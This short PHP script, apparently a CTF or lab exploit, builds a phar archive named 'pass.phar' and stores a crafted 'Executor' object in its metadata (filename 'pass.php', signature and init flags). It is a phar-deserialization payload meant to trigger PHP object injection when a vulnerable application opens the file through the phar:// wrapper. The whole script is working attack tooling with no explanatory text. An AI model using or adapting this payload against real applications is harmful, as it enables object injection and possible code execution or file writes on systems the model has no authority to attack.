<?php
class Executor
{
  private $filename = "pass.php";
  private $signature = True;
  private $init = False;
}

$phar = new Phar("pass.phar");
$phar->startBuffering();
$phar->addFromString("pass.txt", 'test');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new Executor();
$phar->setMetadata($o);
$phar->stopBuffering();
